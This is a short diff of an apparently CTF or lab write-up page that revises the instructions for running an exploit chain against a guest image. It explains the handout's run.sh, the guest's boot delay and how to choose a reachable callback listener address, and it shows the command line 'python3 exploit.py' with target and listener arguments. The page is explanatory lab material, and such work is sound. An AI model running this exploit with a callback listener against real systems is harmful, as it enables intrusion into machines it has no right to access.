@@ -648,7 +648,8 @@ def main():
 
 if __name__ == "__main__":
     main()</code></pre>
-          <p>Against a local container, with the listener on the Docker bridge address:</p>
+          <p><code>run.sh</code> in the handout boots the same image locally and starts <code>proxy.py</code> beside it. The guest takes about four seconds to bring the e1000 link up, and the first stage has no socket timeout, so connecting before that hangs rather than fails.</p>
+          <p>The last two arguments are the listener, and its address has to be one the guest can reach — <code>10.0.2.2</code> for the handout under SLIRP, the bridge address for a container, a routable one for the real instance. Get it wrong and the chain still fires: the guest blocks on a connection going nowhere, the box panics, and the script still reports success with nothing on the listener. This run was against a container:</p>
           <pre><code>python3 exploit.py 127.0.0.1 31337 172.17.0.1 4444</code></pre>
           <p>Expected output:</p>
           <pre><code>NEPHILIM | 127.0.0.1:31337 -&gt; 172.17.0.1:4444
